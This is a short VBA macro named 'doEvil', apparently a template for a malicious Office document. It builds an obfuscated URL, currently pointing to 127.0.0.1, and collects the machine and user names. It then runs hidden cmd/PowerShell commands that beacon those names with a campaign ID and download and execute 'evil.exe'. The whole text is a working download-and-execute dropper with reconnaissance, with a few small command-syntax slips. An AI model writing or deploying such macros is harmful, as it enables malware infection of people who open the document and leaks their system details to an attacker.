
Public Declare PtrSafe Function ShellExecute Lib "Shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long


Sub doEvil()


Dim computerName As String
Dim userName As String
Dim reqObj As Object
Dim url As String
Dim wordObj As Object
Dim selectionObj As Object
Dim selection As Object
Dim handle As Long
Dim cmdLine As String
Dim psCmd As String
Dim dwResult As Long
Dim id As String


url = "*h;*t;*t;*p;*:;*/;*/"
url = url + ";*1;*2;*7;*.;*0;*.;*0;*.;*1"


url = Replace(url, ";", "")
url = Replace(url, "*", "")

id = "<campagin_ID>"
computerName = Environ$("computername")
userName = Environ$("username")


psCmd = "Invoke-WebRequest " + url + " -Headers @{'User' =  ${env:computername} + ':' + ${env:username}; 'Stage' = 'Stage 2'; 'ID' ='" + id + "'}"
cmdLine = "/c powershell -c " + Chr(34) + psCmd + Chr(34)

dwResult = ShellExecute(0, "open", "C:\Windows\system32\cmd.exe", cmdLine, 0, 0)

fileUrl = url + "/evil.exe"
downloadCmd = "Invoke-WebRequest" + fileUrl + "-OutFile evil.exe"
downloadCmdLine = "/c powershell -c " + Chr(34) + downloadCmd + Chr(34)


ShellExecute(0, "open", "C:\Windows\system32\cmd.exe", downloadCmdLine, 0, 0)
Shell("evil.exe")



End Sub



